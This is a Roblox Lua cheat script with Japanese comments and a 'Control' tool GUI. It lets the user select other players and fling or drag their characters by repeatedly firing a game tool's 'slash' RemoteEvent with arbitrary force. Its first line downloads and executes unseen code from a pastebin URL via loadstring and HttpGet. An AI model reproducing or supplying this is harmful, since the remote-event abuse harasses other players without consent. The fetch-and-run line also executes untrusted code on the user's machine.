loadstring(game:HttpGet("https://pastebin.com/raw/Qw9A3dbP", true))()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

-- 設定
local CONFIG = {
	DefaultSpeed = 8,
	ThrowForce = 80,
	ThrowUpForce = 60,
	HighlightColor = Color3.fromRGB(0, 170, 255),
	LockedHighlightColor = Color3.fromRGB(255, 50, 50),
	ButtonAnimationTime = 0.15,
	MaxTargets = 10, -- マルチモード時の最大ターゲット数
}

-- 状態管理
local State = {
	currentMode = "Single",
	selectedTarget = nil,
	selectedTargets = {},
	isLocked = false,
	draggingLoop = nil,
	toolEquipped = false,
	currentSpeed = CONFIG.DefaultSpeed,
	autoRotate = false,
}

local directions = {
	Up = false, 
	Down = false, 
	Left = false, 
	Right = false, 
	Forward = false, 
	Backward = false
}

-- ツール作成
local tool = Instance.new("Tool")
tool.Name = "Control"
tool.RequiresHandle = false
tool.CanBeDropped = false
tool.Parent = LocalPlayer:WaitForChild("Backpack")

-- GUI作成
local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
screenGui.Name = "PullUI"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true

-- ボタン作成ヘルパー関数（改善版）
local function createButton(name, text, pos, size)
	local btn = Instance.new("TextButton")
	btn.Name = name
	btn.Text = text
	btn.Size = size or UDim2.new(0, 80, 0, 40)
	btn.Position = pos
	btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 16
	btn.BorderSizePixel = 2
	btn.BorderColor3 = Color3.fromRGB(70, 70, 70)
	btn.AutoButtonColor = false
	btn.Parent = screenGui
	btn.Visible = false
	
	-- 角を丸くする
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 8)
	corner.Parent = btn
	
	-- ホバーエフェクト
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
	
	return btn
end

-- ボタン配置
local baseX = 1
local offsetX = -180
local startY = 0.3

local upButton = createButton("UpButton", "⬆", UDim2.new(baseX, offsetX, startY, 0))
local downButton = createButton("DownButton", "⬇", UDim2.new(baseX, offsetX, startY + 0.15, 0))
local leftButton = createButton("LeftButton", "⬅", UDim2.new(baseX, offsetX - 90, startY + 0.075, 0))
local rightButton = createButton("RightButton", "➡", UDim2.new(baseX, offsetX + 90, startY + 0.075, 0))
local forwardButton = createButton("ForwardButton", "⬆️ Fwd", UDim2.new(baseX, offsetX + 90, startY - 0.1, 0))
local backButton = createButton("BackButton", "⬇️ Bwd", UDim2.new(baseX, offsetX - 90, startY - 0.1, 0))

local throwButton = createButton("ThrowButton", "🚀 Throw", UDim2.new(baseX, offsetX - 31, startY - 0.26, 0), UDim2.new(0, 160, 0, 40))
local lockButton = createButton("LockTarget", "🔒 Lock", UDim2.new(baseX, offsetX - 30, startY + 0.30, 0), UDim2.new(0, 140, 0, 35))
local modeButton = createButton("ModeButton", "Mode: Single", UDim2.new(baseX, offsetX - 20, startY + 0.42, 0), UDim2.new(0, 150, 0, 35))
local clearButton = createButton("ClearButton", "❌ Clear All", UDim2.new(baseX, offsetX - 20, startY + 0.54, 0), UDim2.new(0, 150, 0, 35))
local speedButton = createButton("SpeedButton", "Speed: 8", UDim2.new(baseX, offsetX - 20, startY + 0.66, 0), UDim2.new(0, 150, 0, 35))

-- 情報表示ラベル
local infoLabel = Instance.new("TextLabel")
infoLabel.Name = "InfoLabel"
infoLabel.Size = UDim2.new(0, 200, 0, 60)
infoLabel.Position = UDim2.new(baseX, offsetX - 35, startY - 0.42, 0)
infoLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
infoLabel.BackgroundTransparency = 0.3
infoLabel.TextColor3 = Color3.new(1, 1, 1)
infoLabel.Font = Enum.Font.GothamBold
infoLabel.TextSize = 14
infoLabel.Text = "Targets: 0"
infoLabel.TextWrapped = true
infoLabel.Parent = screenGui
infoLabel.Visible = false

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = infoLabel

-- RemoteEvent検索関数（改善版）
local function findRemoteEvent()
	local containers = {LocalPlayer.Backpack, LocalPlayer.Character}
	for _, container in ipairs(containers) do
		if container then
			for _, tool in ipairs(container:GetChildren()) do
				if tool:IsA("Tool") then
					local ev = tool:FindFirstChild("Event")
					if ev and ev:IsA("RemoteEvent") then
						return ev
					end
				end
			end
		end
	end
	return nil
end

-- ハイライト適用（改善版）
local function applyHighlight(character, isLocked)
	if not character then return end
	
	local existingHighlight = character:FindFirstChild("ClickHighlight")
	if existingHighlight then
		existingHighlight:Destroy()
	end
	
	local h = Instance.new("Highlight")
	h.Name = "ClickHighlight"
	h.Adornee = character
	h.FillTransparency = 0.8
	h.FillColor = isLocked and CONFIG.LockedHighlightColor or CONFIG.HighlightColor
	h.OutlineColor = isLocked and CONFIG.LockedHighlightColor or CONFIG.HighlightColor
	h.OutlineTransparency = 0
	h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
	h.Parent = character
end

-- ハイライトクリア関数
local function clearHighlight()
	for _, model in ipairs(State.selectedTargets) do
		if model and model:FindFirstChild("ClickHighlight") then
			model.ClickHighlight:Destroy()
		end
	end

	if State.selectedTarget and State.selectedTarget:FindFirstChild("ClickHighlight") then
		State.selectedTarget.ClickHighlight:Destroy()
	end

	State.selectedTargets = {}
	State.selectedTarget = nil
	updateInfoLabel()
end

-- 情報ラベル更新
function updateInfoLabel()
	local count = State.currentMode == "Multiple" and #State.selectedTargets or (State.selectedTarget and 1 or 0)
	infoLabel.Text = string.format("Targets: %d\nMode: %s\nSpeed: %d", 
		count, 
		State.currentMode,
		State.currentSpeed
	)
end

-- 相対方向ベクトル取得
local function getRelativeDirectionVector()
	local char = LocalPlayer.Character
	if not char or not char:FindFirstChild("HumanoidRootPart") then 
		return Vector3.zero 
	end

	local hrp = char.HumanoidRootPart
	local forward = hrp.CFrame.LookVector
	local right = hrp.CFrame.RightVector
	local up = Vector3.yAxis

	local dir = Vector3.zero
	if directions.Forward then dir += forward end
	if directions.Backward then dir -= forward end
	if directions.Right then dir += right end
	if directions.Left then dir -= right end
	if directions.Up then dir += up end
	if directions.Down then dir -= up end

	return dir
end

-- 方向ループ更新
local function updateDirectionLoop()
	if State.draggingLoop then 
		State.draggingLoop:Disconnect() 
	end
	
	local remote = findRemoteEvent()
	if not remote then return end

	State.draggingLoop = RunService.Heartbeat:Connect(function()
		local targets = (State.currentMode == "Multiple") and State.selectedTargets or {State.selectedTarget}
		
		for _, t in ipairs(targets) do
			if t and t:FindFirstChild("HumanoidRootPart") then
				local dirVector = getRelativeDirectionVector()
				if dirVector.Magnitude > 0 then
					remote:FireServer("slash", t, dirVector.Unit * State.currentSpeed)
				end
			end
		end
	end)
end

-- ターゲット削除関数
local function removeTarget(target)
	for i, t in ipairs(State.selectedTargets) do
		if t == target then
			table.remove(State.selectedTargets, i)
			if target:FindFirstChild("ClickHighlight") then
				target.ClickHighlight:Destroy()
			end
			break
		end
	end
	updateInfoLabel()
end

-- モードボタン
modeButton.MouseButton1Click:Connect(function()
	clearHighlight()
	
	if State.currentMode == "Single" then
		State.currentMode = "Multiple"
		modeButton.Text = "Mode: Multiple"
	else
		State.currentMode = "Single"
		modeButton.Text = "Mode: Single"
	end
	updateInfoLabel()
end)

-- クリアボタン
clearButton.MouseButton1Click:Connect(function()
	clearHighlight()
	if State.draggingLoop then 
		State.draggingLoop:Disconnect() 
	end
end)

-- スピードボタン
speedButton.MouseButton1Click:Connect(function()
	local speeds = {4, 8, 12, 16, 20}
	local currentIndex = table.find(speeds, State.currentSpeed) or 2
	local nextIndex = (currentIndex % #speeds) + 1
	State.currentSpeed = speeds[nextIndex]
	speedButton.Text = "Speed: " .. State.currentSpeed
	updateInfoLabel()
end)

-- 矢印ボタン接続
local function connectArrowButton(button, dirKey)
	button.MouseButton1Down:Connect(function()
		directions[dirKey] = true
		button.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
	end)
	
	button.MouseButton1Up:Connect(function()
		directions[dirKey] = false
		button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	end)
	
	button.TouchTap:Connect(function()
		directions[dirKey] = true
		button.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
		task.delay(0.2, function()
			directions[dirKey] = false
			button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		end)
	end)
end

connectArrowButton(upButton, "Up")
connectArrowButton(downButton, "Down")
connectArrowButton(leftButton, "Left")
connectArrowButton(rightButton, "Right")
connectArrowButton(forwardButton, "Forward")
connectArrowButton(backButton, "Backward")

-- マウスクリック（改善版）
Mouse.Button1Down:Connect(function()
	local target = Mouse.Target
	if not target then return end
	
	local model = target:FindFirstAncestorOfClass("Model")
	local player = Players:GetPlayerFromCharacter(model)
	
	if player and player ~= LocalPlayer then
		if State.currentMode == "Single" then
			clearHighlight()
			State.selectedTarget = model
			State.selectedTargets = {}
			applyHighlight(model, State.isLocked)
		else
			-- マルチモード
			if table.find(State.selectedTargets, model) then
				-- 既に選択されている場合は削除
				removeTarget(model)
			else
				-- 最大数チェック
				if #State.selectedTargets >= CONFIG.MaxTargets then
					warn("最大ターゲット数に達しました: " .. CONFIG.MaxTargets)
					return
				end
				table.insert(State.selectedTargets, model)
				applyHighlight(model, State.isLocked)
			end
		end
		updateDirectionLoop()
		updateInfoLabel()
	end
end)

-- スローボタン
throwButton.MouseButton1Click:Connect(function()
	local remote = findRemoteEvent()
	if not remote then return end
	
	local targets = (State.currentMode == "Multiple") and State.selectedTargets or {State.selectedTarget}

	for _, t in ipairs(targets) do
		local hrp = t and t:FindFirstChild("HumanoidRootPart")
		local myChar = LocalPlayer.Character
		
		if hrp and myChar and myChar:FindFirstChild("HumanoidRootPart") then
			local forward = myChar.HumanoidRootPart.CFrame.LookVector
			local force = forward * CONFIG.ThrowForce + Vector3.new(0, CONFIG.ThrowUpForce, 0)
			remote:FireServer("slash", t, force)
		end
	end
end)

-- ロックボタン
lockButton.MouseButton1Click:Connect(function()
	State.isLocked = not State.isLocked
	lockButton.Text = State.isLocked and "🔓 Unlock" or "🔒 Lock"
	
	-- ハイライトカラー更新
	local targets = (State.currentMode == "Multiple") and State.selectedTargets or {State.selectedTarget}
	for _, t in ipairs(targets) do
		if t then
			applyHighlight(t, State.isLocked)
		end
	end
end)

-- ツール装備時
tool.Equipped:Connect(function()
	State.toolEquipped = true
	upButton.Visible = true
	downButton.Visible = true
	leftButton.Visible = true
	rightButton.Visible = true
	forwardButton.Visible = true
	backButton.Visible = true
	throwButton.Visible = true
	lockButton.Visible = true
	modeButton.Visible = true
	clearButton.Visible = true
	speedButton.Visible = true
	infoLabel.Visible = true
	updateInfoLabel()
end)

-- ツール装備解除時
tool.Unequipped:Connect(function()
	State.toolEquipped = false
	upButton.Visible = false
	downButton.Visible = false
	leftButton.Visible = false
	rightButton.Visible = false
	forwardButton.Visible = false
	backButton.Visible = false
	throwButton.Visible = false
	lockButton.Visible = false
	modeButton.Visible = false
	clearButton.Visible = false
	speedButton.Visible = false
	infoLabel.Visible = false

	if State.draggingLoop then 
		State.draggingLoop:Disconnect() 
	end
	
	directions = {
		Up = false, 
		Down = false, 
		Left = false, 
		Right = false, 
		Forward = false, 
		Backward = false
	}

	if not State.isLocked then
		clearHighlight()
	end
end)

-- キャラクター再スポーン時
LocalPlayer.CharacterAdded:Connect(function()
	if not State.isLocked then
		State.selectedTarget = nil
		State.selectedTargets = {}
		clearHighlight()
	end
	
	if State.draggingLoop then 
		State.draggingLoop:Disconnect() 
	end
	
	State.toolEquipped = false
	updateInfoLabel()
end)

-- キーボードショートカット
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed or not State.toolEquipped then return end
	
	if input.KeyCode == Enum.KeyCode.C then
		clearButton.MouseButton1Click:Fire()
	elseif input.KeyCode == Enum.KeyCode.M then
		modeButton.MouseButton1Click:Fire()
	elseif input.KeyCode == Enum.KeyCode.L then
		lockButton.MouseButton1Click:Fire()
	elseif input.KeyCode == Enum.KeyCode.T then
		throwButton.MouseButton1Click:Fire()
	end
end)

print("Enhanced Control Script loaded successfully!")
print("Keyboard shortcuts: C=Clear, M=Mode, L=Lock, T=Throw")
